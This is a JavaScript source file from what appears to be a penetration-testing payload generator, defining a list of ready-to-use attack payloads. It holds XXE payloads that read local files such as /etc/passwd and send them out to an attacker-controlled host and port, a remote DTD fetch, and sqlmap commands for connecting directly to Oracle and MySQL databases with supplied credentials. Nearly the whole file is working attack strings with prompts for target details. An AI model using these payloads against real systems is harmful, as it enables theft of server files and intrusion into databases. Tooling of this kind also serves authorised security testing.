
var M = require('mstring'),
	ask = require('../modules/questionUser'),
	web = require("../modules/webserver/webserver.js");

// Payload Array
arrayWeb = [];

var Load = function(obj){
	arrayWeb.push(obj);
}

// Question helper method
var questions = [];
var question = function(val){
	questions.push(val);
}

/*
###########################################
############### Payloads ##################
###########################################


---[Payload Parameters]---

Required: title, payload, and category
Optional: callback (used for prompt variable)

	Ex:

	callback: function(bro){
		question.ask("Do you even ...?") Ask the user something, return value will be entered as PROMPT value
		question.ask(ask.http) Ask user if they want to start a webserver after the payload is printed
	}


---[Variable Formatting]---

* If variables aren't added properly, they will not work
* Variables can include instructions if needed.
* Instructions should be kept in parenthesis

	ex: foobar <RHOST> <LHOST> <LPORT>
	ex: foobar <RHOST (hostname)> <RPORT>


*/


// ########## XXE Attacks ####################

Load({
	title: "Remote DTD File Parsing",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://<LHOST>:<LPORT>' >",
	callback: function(bro){
		question(ask.http);
		ask.some(questions, bro);
	},
	category: "XML"
})


Load({
	title: "XXE (Local File Read)",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://<PROMPT>\"> ]>&bar;",
	callback: function(bro){
	  question("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)");
	  question(ask.http);
	  ask.some(questions, bro);
	},
	category: "XML"
})

Load({
	title: "XXE (Local File Read using parameter entities)",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/inline\">%dtd; ]><methodCall><methodName>&xxe;</methodName></methodCall>",
	callback: function(bro){
	  question("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)");
	  question(ask.http);
	  ask.some(questions, bro);
	},
	category: "XML"
})




Load({
	title: "XXE (Out of Band File Exfiltration using parameter entities)",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<PROMPT>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/send\">%dtd;%send;]>",
	callback: function(bro){
		question("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)");
		question(ask.http);
		ask.some(questions, bro);
	},
	category: "XML"
})


// ####### sqlmap #########

Load({
	title: "Use sqlmap to directly connect to an Oracle db (requires Oracle instant client)",
	payload: "sqlmap -d 'oracle://<PROMPT (username:password)>@<RHOST>:<RPORT>/<PATH (SID)>'",
	category: "SQLi",
	callback: function(bro){
		question("What DB credentials would you like to use? (Enter as username:password)");
		ask.some(questions, bro);
	}
})

Load({
	title: "Use sqlmap to directly connect to a MySQL db",
	payload: "sqlmap -d 'mysql://<PROMPT (username:password)>@<RHOST>:<RPORT>/<PATH (dbname)>'",
	category: "SQLi",
	callback: function(bro){
		question("What DB credentials would you like to use? (Enter as username:password)");
		ask.some(questions, bro);
	}
})

// sqlmap -d "mysql://<user>:<password>@<host>:<port>/<dbname>"

/*
######################################################
############### End of Payloads ######################
######################################################
*/

module.exports = arrayWeb;
